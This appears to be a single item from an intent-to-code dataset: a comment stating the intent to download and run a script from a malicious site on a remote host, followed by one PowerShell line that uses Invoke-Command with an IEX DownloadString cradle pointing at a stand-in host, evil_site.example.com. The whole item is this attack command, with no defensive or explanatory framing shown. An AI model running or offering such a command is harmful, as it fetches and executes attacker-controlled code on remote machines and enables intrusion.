# Natural language intent:
# Invoke a command on a remote host to download and execute a script from a malicious site using PowerShell.

Invoke-Command -ComputerName <remote_host> -ScriptBlock {IEX(New-Object Net.WebClient).DownloadString('http://evil_site.example.com')}
